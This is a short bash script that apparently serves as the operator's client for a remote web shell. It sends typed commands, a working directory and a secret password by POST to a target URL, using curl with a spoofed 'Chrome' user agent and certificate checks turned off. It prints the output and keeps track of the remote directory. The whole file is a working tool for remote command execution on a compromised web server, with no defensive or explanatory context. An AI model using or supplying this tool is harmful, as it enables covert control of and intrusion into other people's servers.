
dir="./"
while [ true ];do
echo
echo
echo -e "\e[1;31mPath : \e[1;32m$dir\e[0m"
echo
echo
read -p $'\e[1;33mCommand\e[1;32m : ' cmd
if [[ $cmd == "clear" ]];then
clear
else
echo -e "\e[1;34m"
curl -ks -A "Chrome" -X POST -d "cmd=$cmd&d=$dir&secret=$2" $1 | tail -n +2
dir1=$(curl -ks -A "Chrome" -X POST -d "cmd=$cmd&d=$dir&secret=$2" $1 | head -n 1)
if echo $dir1 | grep -q "No such file or directory";then
dir=$dir
else
dir=$dir1
fi
fi
done
